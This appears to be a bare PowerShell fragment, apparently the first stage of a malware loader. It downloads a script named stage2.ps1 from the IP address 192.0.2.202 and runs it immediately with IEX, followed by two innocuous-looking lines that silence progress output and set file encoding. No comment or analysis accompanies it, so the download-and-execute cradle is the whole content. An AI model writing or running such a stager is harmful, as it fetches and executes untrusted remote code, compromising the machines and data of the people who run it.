$Stage2Url = 'http://192.0.2.202/stage2.ps1'
$PayloadText = (New-Object System.Net.WebClient).DownloadString($Stage2Url)
IEX $PayloadText
$ProgressPreference = "SilentlyContinue"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
